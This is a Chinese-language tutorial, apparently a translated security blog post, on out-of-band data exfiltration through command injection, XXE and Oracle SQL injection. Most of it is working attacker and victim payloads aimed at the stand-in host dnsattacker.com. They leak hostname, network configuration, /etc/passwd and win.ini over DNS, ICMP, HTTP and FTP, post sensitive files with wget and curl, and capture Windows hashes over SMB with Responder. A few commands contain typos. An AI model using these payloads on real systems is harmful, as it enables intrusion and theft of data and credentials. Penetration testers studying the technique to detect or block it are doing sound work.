+<h1 id="OOB信息外带漏洞"><a href="#OOB信息外带漏洞" class="headerlink" title="OOB信息外带漏洞"></a>OOB信息外带漏洞</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><strong>带外数据（OOB）是一种通过其他传输方式来窃取数据的技术（例如利用DNS解析协议和电子邮件）。OOB技术通常需要易受攻击的实体生成出站TCP/UDP/ICMP请求，然后允许攻击者泄露数据。OOB攻击的成功基于出口防火墙规则，即是否允许来自易受攻击的系统和外围防火墙的出站请求。而从域名服务器（DNS）中提取数据，则被认为是最隐蔽有效的方法。因此，本文也将重点介绍有关DNS泄露数据的技巧。</strong></p>
+<blockquote>
+<p><strong>引发DNS请求</strong></p>
+<p>成功利用DNS从有漏洞的数据库中渗出数据的前提条件是，DBMS中有可用的能直接或间接引发DNS解析过程的子程序。 然后这类的子程序被攻击者利用，作为攻击的媒介。</p>
+<p>任何可以接受网络地址的函数是最有可能被利用来进行这种攻击的。</p>
+</blockquote>
+<p><strong>注：</strong>出于本文目的，我们尽可能的将用于受害者的payloads以最小依赖性和权限保持为单行。</p>
+<h2 id="设置：DNS-OOB查询基础架构"><a href="#设置：DNS-OOB查询基础架构" class="headerlink" title="设置：DNS/OOB查询基础架构"></a>设置：DNS/OOB查询基础架构</h2><h3 id="先决条件"><a href="#先决条件" class="headerlink" title="先决条件"></a><strong>先决条件</strong></h3><blockquote>
+<ol>
+<li><p>具有静态IP地址的公共服务器：出于演示目的，我们将使用由Google云平台（GCP）提供的VPS服务。</p>
+</li>
+<li><p>注册域：访问已注册的域设置，将权限委派给域名服务器。这里我们将使用oob.dnsattacker.com进行DNS解析。</p>
+</li>
+</ol>
+</blockquote>
+<h3 id="具体步骤"><a href="#具体步骤" class="headerlink" title="具体步骤"></a><strong>具体步骤</strong></h3><p>我们使用Google Cloud Platform（GCP）创建具有静态IP地址的Linux机器。请确保你在服务器上具有root权限。如果你之前并没有任何有关GCP的创建经验，那么请参照<a href="https://medium.com/google-cloud/creating-a-virtual-machine-in-google-cloud-platform-ec2d74dbbab0" target="_blank" rel="noopener">本指南</a>进行创建。</p>
+<p><a href="https://image.3001.net/images/20180911/1536629609_5b971b69e8889.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629609_5b971b69e8889.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>我们在注册商的DNS设置中，为我们的域添加了两条记录。使用NameServer定义了一个子域，以及为nameserver定义了A记录（我们GCP服务器的IP）。现在，这些设置将子域的所有DNS请求都路由到了我们的GCP服务器上。</p>
+<p><a href="https://image.3001.net/images/20180911/1536629626_5b971b7a299bb.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629626_5b971b7a299bb.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>我们可以使用tcpdump来观察服务器上的DNS查询情况。</p>
+<p><a href="https://image.3001.net/images/20180911/1536629639_5b971b8756c19.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629639_5b971b8756c19.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<h2 id="系统命令注入：OOB"><a href="#系统命令注入：OOB" class="headerlink" title="系统命令注入：OOB"></a>系统命令注入：OOB</h2><p>我们可以通过解析DNS名称并查找关联的DNS查询，来检测Web应用程序中的操作系统代码注入漏洞。</p>
+<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a><strong>检测</strong></h3><p><strong>DNS</strong></p>
+<p>攻击者：使用Wireshark/tcpdump观察53端口的响应情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n port 53</span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong>在DNS命令中，我们还可以显式定义用于解析的名称服务器。</p>
+<p><strong>Windows</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup test.oob.dnsattacker.com</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping ping.oob.dnsattacker.com</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536629691_5b971bbb3ef0e.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>UNIX</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">host host.oob.dnsattacker.com</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536629709_5b971bcd4c91a.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629709_5b971bcd4c91a.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>同样，我们可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dig test.oob.dnsattacker.com</span><br><span class="line">ping test.oob.dnsattacker.com</span><br><span class="line">nslookup test.oob.dnsattacker.com</span><br></pre></td></tr></table></figure>
+
+<h3 id="利用-渗出"><a href="#利用-渗出" class="headerlink" title="利用/渗出"></a>利用/渗出</h3><p><strong>DNS</strong></p>
+<p><strong>注：</strong>使用Wireshark/tcpdump观察53端口的响应情况。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -n port 53</span><br></pre></td></tr></table></figure>
+
+<p><strong>Windows</strong></p>
+<p>受害者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /v /c <span class="string">"hostname &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V "</span>CERTIFICATE<span class="string">" temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt;temp3 &amp;&amp; set FINAL=!MYVAR!.oob.dnsattacker.com &amp;&amp; nslookup !FINAL!"</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> “encoded output” |base64 -d  <span class="comment"># decode the output with base64</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536629736_5b971be894844.png!small" alt="7.png"></strong></p>
+<p>使用多行发送输出</p>
+<p>受害者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /v /c <span class="string">"ipconfig &gt; output &amp;&amp; certutil -encodehex -f output output.hex 4 &amp;&amp; powershell <span class="variable">$text</span>=Get-Content output.hex;<span class="variable">$subdomain</span>=<span class="variable">$text</span>.replace(' ','');<span class="variable">$j</span>=11111;foreach(<span class="variable">$i</span> in <span class="variable">$subdomain</span>)&#123; <span class="variable">$final</span>=<span class="variable">$j</span>.tostring()+'.'+<span class="variable">$i</span>+'.file.oob.dnsattacker.com';<span class="variable">$j</span> += 1; nslookup <span class="variable">$final</span> &#125;"</span>    <span class="comment"># Sending file in HEX</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n port 53 | tee file.txt</span><br></pre></td></tr></table></figure>
+
+<p>提取和构建输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0x<span class="variable">$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ &#123;print $1&#125;'|sort -u| cut -d '.' -f 2|tr -d '\n')</span>"</span> | xxd -r -p</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536629766_5b971c06c0cb5.png!small" alt="8.png"></strong></p>
+<p>限制条件：需要Powershell。</p>
+<p><strong>Unix</strong></p>
+<p>受害者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var=11111 &amp;&amp; <span class="keyword">for</span> b <span class="keyword">in</span> $(ifconfig|xxd -p ); <span class="keyword">do</span> var=$((var+1)) &amp;&amp; dig  <span class="variable">$var</span>.<span class="variable">$b</span>.file.oob.dnsattacker.com; <span class="keyword">done</span>   <span class="comment"># Sending file in HEX</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n port 53 | tee file.txt</span><br></pre></td></tr></table></figure>
+
+<p>提取和构建输出：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0x<span class="variable">$(cat file.txt |tr ' ' '\n' |awk '/file.oob.dnsattacker.com/ &#123;print $1&#125;'|sort -u| cut -d '.' -f 2|tr -d '\n')</span>"</span> | xxd -r -p</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536629792_5b971c20aa1f9.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629792_5b971c20aa1f9.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>与十六进制编码相比，Base64编码文件会小很多。</p>
+<p>受害者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var=11111 &amp;&amp; <span class="keyword">for</span> i <span class="keyword">in</span> $(ifconfig|base64|awk <span class="string">'&#123;gsub(/.&#123;50&#125;/,"&amp;\n")&#125;1'</span>); <span class="keyword">do</span> var=$((var+1)) &amp;&amp; nslookup <span class="variable">$var</span>.<span class="variable">$i</span>.file.oob.dnsattacker.com; <span class="keyword">done</span><span class="comment"># Sending file in base64</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat file2.txt |tr <span class="string">' '</span> <span class="string">'\n'</span> |awk <span class="string">'/file.oob.dnsattacker.com/ &#123;print $1&#125;'</span>|sort -u| cut -d <span class="string">'.'</span> -f 2|tr -d <span class="string">'\n'</span>|base64 -d    <span class="comment"># Extracting Output</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536629818_5b971c3ab5d9c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629818_5b971c3ab5d9c.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<h3 id="ICMP"><a href="#ICMP" class="headerlink" title="ICMP"></a>ICMP</h3><p><strong>Windows</strong></p>
+<p>受害者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /v /c <span class="string">"ipconfig &gt; output.txt &amp;&amp; powershell <span class="variable">$text</span>=Get-Content output.txt;<span class="variable">$ICMPClient</span> = New-Object System.Net.NetworkInformation.Ping;<span class="variable">$PingOptions</span> = New-Object System.Net.NetworkInformation.PingOptions;<span class="variable">$PingOptions</span>.DontFragment = <span class="variable">$True</span>;<span class="variable">$sendbytes</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$text</span>);<span class="variable">$ICMPClient</span>.Send('dnsattacker.com',60 * 1000, <span class="variable">$sendbytes</span>, <span class="variable">$PingOptions</span>);</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump <span class="string">'icmp and src host 202.14.120.xx'</span> -w powericmp.pcap  <span class="comment">#To capture</span></span><br></pre></td></tr></table></figure>
+
+<p>提取数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0x<span class="variable">$(tshark -n -q -r powericmp.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')</span>"</span> | xxd -r -p   <span class="comment">#Or Use Wireshark gui</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536629847_5b971c57ea468.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p>限制条件：需要Powershell。</p>
+<p><strong>Unix</strong></p>
+<p>受害者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd | xxd -p -c 16 | <span class="keyword">while</span> <span class="built_in">read</span> exfil; <span class="keyword">do</span> ping -p <span class="variable">$exfil</span> -c 1 dnsattacker.com;don</span><br></pre></td></tr></table></figure>
+
+<p>攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump  <span class="string">'icmp and src host 202.14.120.xx'</span> -w icmp_file.pcap<span class="comment">#To capture</span></span><br></pre></td></tr></table></figure>
+
+<p>提取数据：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0x<span class="variable">$(tshark -n -q -r icmp_file.pcap -T fields -e data.data | tr -d '\n' | tr -d ':')</span>"</span> | xxd -r -p   <span class="comment">#Or Use Wireshark gui</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536629878_5b971c76723bd.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629878_5b971c76723bd.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<h3 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h3><p><strong>Windows</strong></p>
+<p>受害者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /v /c <span class="string">"ipconfig &gt; temp &amp;&amp; certutil -f -encodehex temp output.hex 12 &amp;&amp; set /p MYVAR=&lt;output.hex &amp;&amp; set FINAL="</span>http://dnsattacker.com:9000/!MYVAR!<span class="string">" &amp;&amp; powershell Invoke-WebRequest !FINAL!"</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong>如果PowerShell不可用，请使用“mshta !Final!”。</p>
+<p>攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0x<span class="variable">$(ncat -lvp 9000 |grep -i get|tr -d '/' |cut -d ' ' -f2)</span>"</span> |xxd -r -p</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536629909_5b971c951a8f7.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>Unix</strong></p>
+<p>受害者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget --header=evil:$(ifconfig|xxd -p -c 100000) http://dnsattacker.com:9000</span><br></pre></td></tr></table></figure>
+
+<p>攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"0x<span class="variable">$(ncat -lvp 9000 |grep -i evil|tr -d '/' |cut -d ' ' -f2)</span>"</span> |xxd -r -p</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536629934_5b971cae895a1.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629934_5b971cae895a1.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>同样，我们可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wget –post-data exfil=<span class="string">'cat /etc/passwd'</span> http://dnsattacker.com           <span class="comment"># extract data  in post section</span></span><br><span class="line"></span><br><span class="line">wget –post-file trophy.php http://dnsattacker.com    <span class="comment"># extract source code</span></span><br><span class="line"></span><br><span class="line">cat /path/to/sensitive.txt | curl –F <span class="string">":data=@-"</span> http://dnsattacker.com/test.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="SMB-使用Responder窃取哈希"><a href="#SMB-使用Responder窃取哈希" class="headerlink" title="SMB [使用Responder窃取哈希]"></a>SMB [使用Responder窃取哈希]</h3><p><strong>Windows</strong></p>
+<p>受害者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use h: \\dnsattacker.com\web</span><br></pre></td></tr></table></figure>
+
+<p>攻击者</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./Responder.py -I eth0<span class="comment">#Run responder to capture hashes</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536629964_5b971cccb6bd5.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536629964_5b971cccb6bd5.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>同样，我们可以使用：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use h: \\dnsattacker.com\web /user: &#123;password&#125; &amp;&amp; copy &#123;file.txt to Copy&#125; h:\&#123;file.txt&#125;.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="XXE：Out-of-Band"><a href="#XXE：Out-of-Band" class="headerlink" title="XXE：Out of Band"></a>XXE：Out of Band</h2><h3 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a><strong>检测</strong></h3><p>我们可以通过向攻击者域（即oob.dnsattacker.com）创建DNS请求来确认XXE漏洞是否存在。这里有一个非常好的<a href="https://pentesterlab.com/exercises/play_xxe" target="_blank" rel="noopener">XML实体利用的练习框架</a>推荐给大家。</p>
+<p>受害者：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo SYSTEM "http://xxeoob.oob.dnsattacker.com"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;e1;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>攻击者：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n udp port 53</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536630003_5b971cf3de464.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>限制：</strong>在撰写本文时，DNS查询仅能用于XXE的检测。</p>
+<h3 id="利用-渗出-1"><a href="#利用-渗出-1" class="headerlink" title="利用/渗出"></a>利用/渗出</h3><p><strong>HTTP</strong></p>
+<p>攻击者：运行python HTTP server来托管dtd文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHttpServer <span class="number">9000</span></span><br></pre></td></tr></table></figure>
+
+<p>受害者：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://dnsattacker.com:9000/linux.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>linux.dtd</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;http://dnsattacker.com:9000/%data;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536630039_5b971d17c1be1.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>注：</strong>对基于Windows的受害者机器，请使用以下dtd文件。</p>
+<p><strong>windows.dtd</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos; http://dnsattacker.com:9000/%data;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h3><p>攻击者：</p>
+<p>运行python HTTP server来托管dtd文件以及xxeftp server（请参考<a href="https://gist.github.com/staaldraad/280f167f5cb49a80b4a3" target="_blank" rel="noopener">此处</a>）。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHttpServer <span class="number">9000</span></span><br><span class="line"></span><br><span class="line">python xxeftp.py</span><br></pre></td></tr></table></figure>
+
+<p>受害者：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT r ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % sp SYSTEM "http://dnsattacker.com:9000/linux.dtd"&gt;</span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span>&amp;exfil;<span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>linux.dtd</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;ftp://dnsattacker.com:2121/%data;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536630079_5b971d3fd57e0.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>注：</strong>对基于Windows的受害者机器，请使用以下dtd文件。</p>
+<p><strong>windows.dtd</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % data SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &apos;ftp://dnsattacker.com:2121/%data;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="SMB-窃取哈希"><a href="#SMB-窃取哈希" class="headerlink" title="SMB [窃取哈希]"></a>SMB [窃取哈希]</h3><p>攻击者：运行responder捕获哈希值</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./Responder.py -I eth0</span><br></pre></td></tr></table></figure>
+
+<p>受害者：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT foo ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "\\dnsattacker.com\test" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>注：</strong>出于演示目的，我们将使用CVE-2018-0878：Windows远程协助信息泄露漏洞。</p>
+<p><a href="https://image.3001.net/images/20180911/1536630118_5b971d660da4f.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536630118_5b971d660da4f.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>类似地，其他可能泄露数据的payloads</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://oob.dnsattacker.com:port/%data</span><br><span class="line">ftp://oob.dnsattacker.com:port/%data</span><br><span class="line">gopher://oob.dnsattacker.com:port/%data%</span><br><span class="line">ldap://oob.dnsattacker.com:port</span><br><span class="line">\\oob.dnsattacker.com\\C$\\1.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><strong>注：</strong>所有数据库服务器都安装在Windows上。有关SQL Injection cheat sheets请参考[<a href="http://pentestmonkey.net/category/cheat-sheet/sql-injection" target="_blank" rel="noopener">1</a>][<a href="https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/" target="_blank" rel="noopener">2</a>]</p>
+<h3 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h3><p><strong>DNS</strong></p>
+<p>攻击者：使用Wireshark/tcpdump观察53端口响应情况。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -n port 53</span><br></pre></td></tr></table></figure>
+
+<h2 id="ORACLE"><a href="#ORACLE" class="headerlink" title="ORACLE"></a><strong>ORACLE</strong></h2><h3 id="检测-3"><a href="#检测-3" class="headerlink" title="检测"></a><strong>检测</strong></h3><p>受害者</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DBMS_LDAP.INIT((‘oob.dnsattacker.com<span class="string">',80) FROM DUAL;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong><img src="https://image.3001.net/images/20180911/1536630151_5b971d8769f64.png!small" alt="信息外带漏洞(OOB)利用技巧"></strong></p>
+<p><strong>注：</strong>上述功能需要更高的权限才能调用。</p>
+<h3 id="利用-渗出-2"><a href="#利用-渗出-2" class="headerlink" title="利用/渗出"></a>利用/渗出</h3><p><strong>受害者</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> DBMS_LDAP.INIT((<span class="keyword">SELECT</span> <span class="keyword">version</span> <span class="keyword">FROM</span> v$<span class="keyword">instance</span>)||<span class="string">'.attacker.com'</span>,<span class="number">80</span>) <span class="keyword">FROM</span> dual;    <span class="comment">/* Extracting Oracle database version */</span></span><br></pre></td></tr></table></figure>
+
+<p><a href="https://image.3001.net/images/20180911/1536630182_5b971da6a1e4c.png" target="_blank" rel="noopener"><img src="https://image.3001.net/images/20180911/1536630182_5b971da6a1e4c.png!small" alt="信息外带漏洞(OOB)利用技巧"></a></p>
+<p>同样，我们可以使用以下payloads。</p>
+<p><strong>受害者</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||&apos;.attacker.com&apos;,80) FROM dual;      /*Extracting Current user in Oracle database */</span><br></pre></td></tr></table></figure>
+
+<p>如果你使用的Oracle为10G或更低版本，则可以使用一些替代方法来创建DNS查询：UTL_INADDR.GET_HOST_ADDRESS, UTL_HTTP.REQUEST, HTTP_URITYPE.GETCLOB, DBMS_LDAP.INIT and UTL_TCP。</p>
